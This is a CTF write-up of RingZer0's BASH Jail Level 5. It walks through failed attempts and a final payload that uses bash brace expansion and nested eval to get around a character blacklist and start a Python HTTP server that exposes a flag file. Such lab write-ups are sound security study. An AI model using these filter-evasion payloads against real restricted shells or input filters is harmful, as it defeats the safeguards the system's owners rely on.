# Level 5

The last one was indeed very difficult. But before going into details, let's have a look at the prompt:

```
RingZer0 Team Online CTF

BASH Jail Level 5:
Current user is uid=1004(level5) gid=1004(level5) groups=1004(level5)

Flag is located at /home/level5/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
        if [[ $1 == *[bdksctr'?''*''/''<''>''&''$']* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo "Your input:"
        read input
        if check_space "$input" 
        then
                echo -e '\033[0;31mRestricted characters has been used\033[0m'
        else
                output=`$input < /dev/null` &>/dev/null
                echo "Command executed"
        fi
done 

-----------------------------
Your input:
```
So obvisouly a lot of characters are not allowed to be used. This makes the challenge very hard since also redirects (>,<,&) are not possible anymore. So even one has succeeded in reading the file, the OUTPUT has to be redirected to some other device. But the slash (/) is also not allowed, making it hard to specify the output (e.g. /dev/shm/buffer).

Having that in mind I've tried several things:

## Vim
The idea was to start `vim`, **read** the `flag.txt` and write the buffer to sth like `/dev/shm/buffervim`. But `vim` has some problems starting when STDIN=`/dev/null`. At the beginning I saw `vim` starting but then it disapeared suddenly. It took me a file to find out that starting `vim` with STDIN != some tty would be tricky.

## Create another file
Since I was able to read the file easily:

```
$ uniq flag.[a-z][a-z][a-z]
```
... I thought I could create a new file inside `/home/level5/` by using `uniq`:

```
$ uniq flag.[a-z][a-z][a-z] new_file
```
That didn't work and it took some some while to understand **why**. Using `lsattr` I've checked the attributes on `/home/level5`:
```
level1@lxc17-bash-jail:/home/level5$ lsattr -a>&0
----i--------e-- ./.
----i--------e-- ./..
----i--------e-- ./real.sh
lsattr: Permission denied While reading flags on ./flag.txt
----i--------e-- ./prompt.sh
----i--------e-- ./.bash_logout
----i--------e-- ./.bashrc
----i--------e-- ./.profile
level1@lxc17-bash-jail:/home/level5$ 
```
As you can see `/home/level5` is set to **immutable** (i) which means that I can't modify files in that directory or create new ones.

## Use bash magic voodoo
Desperately searching for some solution, I've asked [maxenced](https://ringzer0team.com/profile/8593/maxenced) (who was the last one having solved this level) for some additional hint. BTW: I've "bought" the hint for this hint very early, but it didn't help a lot. Anyway... He told me I should use **bash brace expansions**. Okay, so let's have a look and see what we can do using them:
```
$ echo {a..z}
a b c d e f g h i j k l m n o p q r s t u v w x y z

$ echo {1..10..2}
1 3 5 7 9

$ echo {o..u}ython
oython python qython rython sython tython uython
```
So obvisouly we can **bypass** the restricted characters by simpling iterating through a range of characters. Now the next step was to find a way how to **expand shell commands** (and this was the most imporant part - thx again maxenced). I've tried sth like:

```
$ eval {o..u}ython
bash: oython: command not found
```
`eval` was **not** expanding the commands. Then I've tried sth different:

```
$ `echo echo {o..u}ython\\;`
oython; python; qython; rython; sython; tython; uython;
```
Now let me explain the changes:

* I've added backticks to run the commands
* I've added \; at the end which simply adds a semicolon (;) at the end of each expansion

If I change the `echo` to `eval`, then `eval` will basically run:

```
oython; python; qython; rython; sython; tython; uython;
```
Afterwards I've found out that `python` refused to start if STDIN = `/dev/null` (the same as with `vim`). Then I remembered the solution in a previous level where I've start a **HTTP server** (using `python`) to "download" the flag.txt. So all I wanted to run was:

```
$ python -m SimpleHTTPServer
```
As you may have noticed "SimpleHTTPServer" contains restricted characters like r. So we'll have to use brace expansion again:

```
$ `echo echo {u..o}ython\ -m\ SimpleHTTPSe{u..o}ve{o..u}\\;`
...
```
The next step was to properly escape the backslashes to make sure that eval is executing the right thing. So the final payload was:

```
$ eval eval py{o..u}hon\\ -m\\ SimpleHTTPSe{q..v}ve{q..v}\\; 
```
I would also want to thank David, Ralph and Tobias for their awesome ideas and the great hacking session we had on Friday :)